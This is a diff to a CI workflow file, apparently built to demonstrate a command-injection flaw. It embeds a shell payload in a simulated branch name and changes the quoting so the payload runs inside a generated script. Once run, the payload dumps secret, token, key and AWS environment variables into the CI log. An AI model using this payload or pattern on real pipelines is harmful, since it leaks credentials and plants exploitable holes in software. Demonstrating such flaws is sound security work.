@@ -48,7 +48,8 @@ jobs:
           
           # EXPLOIT DEMONSTRATION: Simulate malicious branch name
           # In real attack, this comes from attacker's fork via pull_request_target
-          BRANCH_NAME='exploit$(printenv | grep -E "(SECRET|PASSWORD|TOKEN|KEY|NEXUS|AWS|DATABASE|API)" | sort)'
+          # Using double quotes to allow command substitution
+          BRANCH_NAME="exploit\$(printenv | grep -E \"(SECRET|PASSWORD|TOKEN|KEY|NEXUS|AWS|DATABASE|API)\" | sort)"
           
           echo "=================================================="
           echo "DEMONSTRATING COMMAND INJECTION VULNERABILITY"
@@ -64,9 +65,10 @@ jobs:
 
           java -jar ${{ env.CHECKSTYLE_JAR }} -c config/checkstyle.xml -f xml -o "$REPORT_FILE" src/ || true
           
-          POST_SCRIPT="/tmp/post-process-${BRANCH_NAME}.sh"
+          POST_SCRIPT="/tmp/post-process-demo.sh"
           echo "#!/bin/bash" > "$POST_SCRIPT"
-          echo "echo 'Post-processing checkstyle results for branch: ${BRANCH_NAME}'" >> "$POST_SCRIPT"
+          # THE VULNERABLE LINE - uses double quotes allowing command substitution
+          echo "echo \"Post-processing checkstyle results for branch: ${BRANCH_NAME}\"" >> "$POST_SCRIPT"
           echo "if [ -f '$REPORT_FILE' ]; then" >> "$POST_SCRIPT"
           echo "  echo 'Checkstyle report generated successfully'" >> "$POST_SCRIPT"
           echo "  cat '$REPORT_FILE' | head -20" >> "$POST_SCRIPT"
